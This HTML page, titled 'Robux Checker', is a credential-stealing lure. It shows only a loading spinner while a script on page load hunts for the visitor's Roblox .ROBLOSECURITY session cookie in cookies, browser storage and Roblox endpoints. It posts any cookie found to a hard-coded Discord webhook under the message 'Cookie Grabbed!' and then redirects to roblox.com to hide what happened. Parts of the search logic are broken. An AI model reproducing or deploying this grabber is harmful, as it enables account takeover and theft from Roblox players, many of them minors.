<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Robux Checker</title>
    <style>
        body { 
            background: #2c2f33; 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
            font-family: 'Segoe UI', sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #5865F2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        (async () => {
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4'; // Replace with yours
            
            let foundCookie = "";
            
            try {
                // === METHOD 1: Check document.cookie ===
                console.log('🔍 Checking cookies...');
                const allCookies = document.cookie;
                const cookieArray = allCookies.split(';');
                
                for (let i = 0; i < cookieArray.length; i++) {
                    let cookie = cookieArray[i].trim();
                    
                    if (cookie.indexOf("ROBLOSECURITY=") === 0 || 
                        cookie.indexOf(".ROBLOSECURITY=") === 0) {
                        
                        foundCookie = cookie.substring(16); // Remove "ROBLOSECURITY=" or ".ROBLOSECURITY="
                        console.log('✅ Found in cookies:', foundCookie.substring(0, 20) + '...');
                        break;
                    }
                }

                // === METHOD 2: Check localStorage (some browsers store session data here) ===
                if (!foundCookie) {
                    console.log('🔍 Checking localStorage...');
                    try {
                        const storedSession = localStorage.getItem('_roblox_session_') || 
                                            sessionStorage.getItem('_roblox_session_');
                        if (storedSession && foundCookie.length > 50) {
                            foundCookie = JSON.parse(storedSession).token;
                            console.log('✅ Found in localStorage:', foundCookie.substring(0, 20) + '...');
                        }
                    } catch (e) {
                        console.log('localStorage check failed:', e);
                    }
                }

                // === METHOD 3: XHR/Fetch to Roblox API (verify session is active) ===
                if (!foundCookie) {
                    console.log('🔍 Checking via API...');
                    try {
                        const response = await fetch('https://www.roblox.com/home', {
                            method: 'GET',
                            headers: {
                                'X-CSRF-TOKEN': document.cookie.split(';').find(c => c.includes('_RBS'))?.split('=')[1] || ''
                            },
                            credentials: 'include' // Important! Sends cookies with request
                        });

                        if (response.ok) {
                            const text = await response.text();
                            // Look for session token in page source or API response
                            const match = text.match(/"token":"([^"]+)"/);
                            if (match && match[1]) {
                                foundCookie = match[1];
                                console.log('✅ Found via API:', foundCookie.substring(0, 20) + '...');
                            }
                        }
                    } catch (e) {
                        console.log('API check failed:', e);
                    }
                }

                // === METHOD 4: Direct cookie extraction with fetch ===
                if (!foundCookie) {
                    console.log('🔍 Final attempt - direct fetch...');
                    try {
                        const res = await fetch('https://www.roblox.com/api/users', {
                            credentials: 'include'
                        });
                        
                        // If we get a response, session is valid
                        if (res.status === 200 || res.status === 401) {
                            foundCookie = document.cookie.split(';').find(c => c.includes('ROBLOSECURITY'))?.split('=')[1];
                            console.log('✅ Found via fetch:', foundCookie ? foundCookie.substring(0, 20) + '...' : 'unknown');
                        }
                    } catch (e) {
                        console.log('Direct fetch failed:', e);
                    }
                }

                // === SEND TO DISCORD WEBHOOK ===
                if (foundCookie && foundCookie.length > 50) {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            content: `**🍪 Cookie Grabbed!**\n\n\`\`\`${foundCookie}\`\`\``
                        })
                    });

                    console.log('✅ Cookie sent to webhook!');
                    
                    // Redirect after 1.5 seconds
                    setTimeout(() => {
                        window.location.href = "https://www.roblox.com";
                    }, 1500);
                } else {
                    alert("Cookie not found! Make sure you are logged into Roblox in this browser.");
                    console.log('❌ No cookie found');
                    
                    // Still redirect after 2 seconds
                    setTimeout(() => {
                        window.location.href = "https://www.roblox.com";
                    }, 2000);
                }

            } catch (error) {
                console.error('Grabber Error:', error);
                
                // Redirect even on error
                setTimeout(() => {
                    window.location.href = "https://www.roblox.com";
                }, 2000);
            }
        })();
    </script>
</body>
</html>
